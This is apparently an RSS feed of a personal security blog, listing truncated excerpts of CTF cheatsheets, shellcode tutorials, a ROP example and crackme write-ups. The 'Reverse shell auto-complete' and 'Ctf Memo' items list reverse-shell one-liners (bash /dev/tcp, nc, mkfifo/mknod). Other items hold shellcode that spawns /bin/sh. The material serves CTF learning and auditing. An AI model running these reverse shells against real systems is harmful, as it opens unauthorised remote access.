<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Master 0xCcC</title>
    <link>https://masterccc.github.io/</link>
    <description>Recent content on Master 0xCcC</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Tue, 10 Dec 2019 00:00:00 +0000</lastBuildDate><atom:link href="https://masterccc.github.io/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Apk - Edit and rebuild</title>
      <link>https://masterccc.github.io/memo/edit_apk/</link>
      <pubDate>Tue, 10 Dec 2019 00:00:00 +0000</pubDate>
      
      <guid>https://masterccc.github.io/memo/edit_apk/</guid>
      <description>Cheatsheet - Apk rebuild for debug purpose Link to heading This tutorial describes the different steps to edit and rebuild an apk from the apk file.
Prerequisites Link to heading This manipulation require to enable USB debugging in your android device (https://developer.android.com/studio/debug/dev-options) and have adb, apktool, jarsigner, keytool and zipalign installed on your computer. A rooted device is NOT needed.
Get the apk from adb : Link to heading First, get the path to the apk in your filesystem :</description>
    </item>
    
    <item>
      <title>Reverse shell auto-complete</title>
      <link>https://masterccc.github.io/tools/reverseshell/</link>
      <pubDate>Sat, 05 Oct 2019 10:41:06 +0200</pubDate>
      
      <guid>https://masterccc.github.io/tools/reverseshell/</guid>
      <description>Reverse shell auto-complete Auditor IP : Auditor Port : Generate Bash bash -i &amp;#x3E;&amp;#x26; /dev/tcp// 0&amp;#x3E;&amp;#x26;1 exec 5&amp;#x3C;&amp;#x3E;/dev/tcp//;cat &amp;#x3C;&amp;#x26;5 | while read line; do $line 2&amp;#x3E;&amp;#x26;5 &amp;#x3E;&amp;#x26;5; done exec /bin/sh 0&amp;#x3C;/dev/tcp// 1&amp;#x3E;&amp;#x26;0 2&amp;#x3E;&amp;#x26;0 Netcat nc -e /bin/bash /bin/nc.traditional -e /bin/bash /bin/nc.traditional -c /bin/bash mkfifo rm f;mkfifo f;cat f|/bin/sh -i 2&amp;#x3E;&amp;#x26;1|nc &amp;#x3E; f rm f;mkfifo f;cat f|/bin/sh -i 2&amp;#x3E;&amp;#x26;1|/bin/nc.openbsd &amp;#x3E; f mknod rm -f x; mknod x p &amp;#x26;&amp;#x26; nc 0&amp;#x3C;x | /bin/bash 1&amp;#x3E;x rm -f x; mknod x p &amp;#x26;&amp;#x26; /bin/nc.</description>
    </item>
    
    <item>
      <title>Python subprocess communication</title>
      <link>https://masterccc.github.io/memo/process_com/</link>
      <pubDate>Fri, 04 Oct 2019 00:00:00 +0000</pubDate>
      
      <guid>https://masterccc.github.io/memo/process_com/</guid>
      <description>Cheatsheet - Python subprocess communication Link to heading Imports Link to heading from subprocess import Popen, PIPE Imports for signals Link to heading import signal, os Start process Link to heading process = Popen([&amp;#39;./sum 50&amp;#39;], shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE) Check if process is alive Link to heading def isAlive(process): poll = process.poll() if poll == None: print(&amp;#34;Program running...&amp;#34;) else: print(&amp;#34;Program stopped :(&amp;#34;) Read from stdout Link to heading def getline(process): return &amp;#34;stdout : &amp;#34; + process.</description>
    </item>
    
    <item>
      <title>/bin/cat Shellcode generator</title>
      <link>https://masterccc.github.io/tools/shellcode_gen/</link>
      <pubDate>Thu, 03 Oct 2019 15:41:06 +0200</pubDate>
      
      <guid>https://masterccc.github.io/tools/shellcode_gen/</guid>
      <description>/bin/cat [your_file] Shellcode generator for intel x86 File name to read : Generate This is your shellcode : \x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x2e\x74\x78\x74\x68\x66\x6c\x61\x67\x89\xe1\x50\x51\x53\x89\xe1\x31\xc0\x83\xc0\x0b\xcd\x80 bits 32 global main SECTION .text main: xor eax,eax ; set eax to 0 push eax ; end of string push 0x7461632f ;&#34;tac/&#34; push 0x6e69622f ;&#34;inb/&#34; mov ebx,esp push eax ; end of string push 0x7478742e push 0x67616c66 mov ecx,esp push eax ; null push ecx ; file push ebx ; /bin/cat mov ecx,esp ; {/bin/cat,file,null} xor eax,eax add eax,0xb int 0x80 Note for myself : &#34;</description>
    </item>
    
    <item>
      <title>Write your shellcode</title>
      <link>https://masterccc.github.io/memo/shellcode/</link>
      <pubDate>Wed, 02 Oct 2019 00:00:00 +0000</pubDate>
      
      <guid>https://masterccc.github.io/memo/shellcode/</guid>
      <description>This memo describe how to write (and test) a shellcode from the corresponding C code.
x86_64 Shellcode Link to heading The shellcode will start /bin/sh. Let&amp;rsquo;s take the following C code :
#include &amp;lt;unistd.h&amp;gt; int main(void){ execve(&amp;#34;/bin/sh&amp;#34;, NULL, NULL); } NULL parameters stands for args and environment, we don&amp;rsquo;t need them for now.
It can be translated in assembly this way :
global _start SECTION .text _start: xor rdx,rdx ; env xor rsi,rsi ; args mov rax, 0x68732f6e69622f ; &amp;#34;/bin/sh&amp;#34; push rax mov rdi,rsp mov rax, 0x3b ; sys_execve (59) syscall ; Quit mov rbx,0 ; return code mov rax,1 ; exit syscall number int 0x80 ; syscall Explanation of the assembly code Link to heading Similar to C code, execve syscall takes 3 args.</description>
    </item>
    
    <item>
      <title>Windows User-Agent</title>
      <link>https://masterccc.github.io/memo/useragent_win/</link>
      <pubDate>Mon, 09 Sep 2019 00:00:00 +0000</pubDate>
      
      <guid>https://masterccc.github.io/memo/useragent_win/</guid>
      <description>Cheatsheet - Windows User-Agent Link to heading Windows Version Link to heading {.table .pure-table .table-striped .table-responsive}
User agent string Windows Versions Windows NT 10.0 Windows 10 Windows NT 6.3 Windows 8.1 Windows NT 6.2 Windows 8 Windows NT 6.1 Windows 7 Windows NT 6.0 Windows Vista Windows NT 5.2 Windows Server 2003; Windows XP x64 Edition Windows NT 5.1 Windows XP Windows NT 5.01 Windows 2000, Service Pack 1 (SP1) Windows NT 5.</description>
    </item>
    
    <item>
      <title>Ctf Memo</title>
      <link>https://masterccc.github.io/memo/ctf/</link>
      <pubDate>Tue, 27 Aug 2019 00:00:00 +0000</pubDate>
      
      <guid>https://masterccc.github.io/memo/ctf/</guid>
      <description>Cheatsheet - CTF Link to heading Find SUID files Link to heading find / -user root -perm -4000 -exec ls -ldb {} \; Reverse shell without &amp;ldquo;nc -e /bin/sh&amp;rdquo; Link to heading mknod /tmp/bp p /bin/sh 0&amp;lt;/tmp/bp | nc addr port 1&amp;gt;/tmp/bp One-line :
mknod /tmp/bp p ; /bin/sh 0&amp;lt;/tmp/bp | nc addr port 1&amp;gt;/tmp/bp Spawn a TTY Link to heading Python Link to heading python -c &amp;#39;import pty; pty.</description>
    </item>
    
    <item>
      <title>Rop Example</title>
      <link>https://masterccc.github.io/memo/rop_example/</link>
      <pubDate>Tue, 27 Aug 2019 00:00:00 +0000</pubDate>
      
      <guid>https://masterccc.github.io/memo/rop_example/</guid>
      <description>ROP x86_64 Link to heading Local gets() x86_64 No setuid() No canary Source code Link to heading #include &amp;lt;stdio.h&amp;gt; int main() { char buffer[32]; puts(&amp;#34;Simple ROP.\n&amp;#34;); gets(buffer); return 0; } Compilation Link to heading gcc -o vuln vuln.c -fno-stack-protector -no-pie $file vuln vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=20e082fc91a594a5d0a331e84688a0d62b3b7b56, not stripped ROP script Link to heading # coding: utf-8 from pwn import * # Choose and run p = process(&amp;#34;.</description>
    </item>
    
    <item>
      <title>x86 Args and local vars</title>
      <link>https://masterccc.github.io/memo/asmx86args/</link>
      <pubDate>Wed, 07 Aug 2019 00:00:00 +0000</pubDate>
      
      <guid>https://masterccc.github.io/memo/asmx86args/</guid>
      <description>Cheatsheet - x86 Args and local vars Link to heading Source code Link to heading int func(char a, char b, char c, char d, char e){ char f = 6, g = 7, h =8 ; printf(&amp;#34;%d %d %d %d %d\n&amp;#34;, a,b,c,d,e); return 0xC0FEE ; } int main(void){ printf(&amp;#34;%d&amp;#34;,func(1,2,3,4,5)); return 0; } Gdb view Link to heading (gdb) disass main ... 0x00001238 &amp;lt;+29&amp;gt;: push 0x5 0x0000123a &amp;lt;+31&amp;gt;: push 0x4 0x0000123c &amp;lt;+33&amp;gt;: push 0x3 0x0000123e &amp;lt;+35&amp;gt;: push 0x2 0x00001240 &amp;lt;+37&amp;gt;: push 0x1 0x00001242 &amp;lt;+39&amp;gt;: call 0x1199 &amp;lt;func&amp;gt; .</description>
    </item>
    
    <item>
      <title>Stego tools (for pictures)</title>
      <link>https://masterccc.github.io/memo/stego/</link>
      <pubDate>Tue, 06 Aug 2019 00:00:00 +0000</pubDate>
      
      <guid>https://masterccc.github.io/memo/stego/</guid>
      <description>Cheatsheet - Stego tools for pictures Link to heading Stegoveritas Link to heading Stegoveritas can be found here : https://github.com/bannsec/stegoVeritas
Create several altered images (contrast/colors/brightness)
Run with common options :
$ stegoveritas -exif -meta -xmp -carve -imageTransform -BruteLSB -extractLSB -trailing massacre.png Steghide Link to heading Available in most of distro&amp;rsquo;s repos.
Common run :
steghide extract -sf file.jpg Stegcracker Link to heading Stegcracker can be found here : https://github.com/Paradoxis/StegCracker</description>
    </item>
    
    <item>
      <title>Bin/asci/hex/b64 converter</title>
      <link>https://masterccc.github.io/tools/convert/</link>
      <pubDate>Sat, 27 Jul 2019 15:41:06 +0200</pubDate>
      
      <guid>https://masterccc.github.io/tools/convert/</guid>
      <description> Separator None Space Comma Other 0x/0b prefix ASCII text Base64 Base 16 Base 10 Base 2 Length (bytes) </description>
    </item>
    
    <item>
      <title>LD_PRELOAD trick</title>
      <link>https://masterccc.github.io/memo/ld_preload/</link>
      <pubDate>Sat, 27 Jul 2019 00:00:00 +0000</pubDate>
      
      <guid>https://masterccc.github.io/memo/ld_preload/</guid>
      <description>Cheatsheet - LD_PRELOAD trick Link to heading ## Compilation
gcc -o hook.so dlsym.c -ldl -fPIC -shared /!\ Order matters
Usage : Link to heading LD_PRELOAD=$PWD/hook.so ./target Examples Link to heading Strcmp hook : Link to heading #define _GNU_SOURCE #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;dlfcn.h&amp;gt; int strcmp(const char *s1, const char *s2){ printf(&amp;#34;Hook strcmp : strcmp(&amp;#39;%s&amp;#39;,&amp;#39;%s&amp;#39;)\n&amp;#34;, s1, s2); int (*true_strcmp)(const char*, const char*); true_strcmp = dlsym(RTLD_NEXT, &amp;#34;strcmp&amp;#34;); return true_strcmp(s1,s2); } SSL inspector : Link to heading #define _GNU_SOURCE #include &amp;lt;stdio.</description>
    </item>
    
    <item>
      <title>Crackmes.de - crackme.02.32 by geyslan</title>
      <link>https://masterccc.github.io/reverse/cm_0232/</link>
      <pubDate>Fri, 26 Jul 2019 00:00:00 +0000</pubDate>
      
      <guid>https://masterccc.github.io/reverse/cm_0232/</guid>
      <description>This is a crackme level 3 (Medium) from https://crackmes.one/crackme/5ab77f6533c5d40ad448cbc2
Fast static analysis Link to heading First, use the file command to see what kind of file it is:
$ file crackme.02.32 crackme.02.32: ELF 32-bit LSB executable, Intel 80386, (SYSV), too many section (65535) A 32 bit ELF, with a nice &amp;ldquo;too many sections&amp;rdquo;, no other userfull information.
Checking the strings in the binary :
Judging by the &amp;ldquo;tracing not allowed&amp;rdquo; and &amp;ldquo;I&amp;rsquo;m sorry GDB&amp;hellip;&amp;rdquo; there are a few anti-debug methods out there.</description>
    </item>
    
    <item>
      <title>Crackmes.de - The_thing by prout</title>
      <link>https://masterccc.github.io/reverse/cm_thething/</link>
      <pubDate>Fri, 26 Jul 2019 00:00:00 +0000</pubDate>
      
      <guid>https://masterccc.github.io/reverse/cm_thething/</guid>
      <description>This is a crackme level 2 (Easy) from https://crackmes.one/crackme/5ab77f5433c5d40ad448c1d6 )
Fast static analysis Link to heading First, let&amp;rsquo;s see what type of file it is:
$ file thething thething: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.4.1, dynamically linked, interpreter /lib/ld-linux.so.2, no section header Ok, so 32 bits ELF and dynamically linked (this detail will be useful later). Not sure if stripped or not because of the &amp;ldquo;no section header&amp;rdquo;.</description>
    </item>
    
  </channel>
</rss>
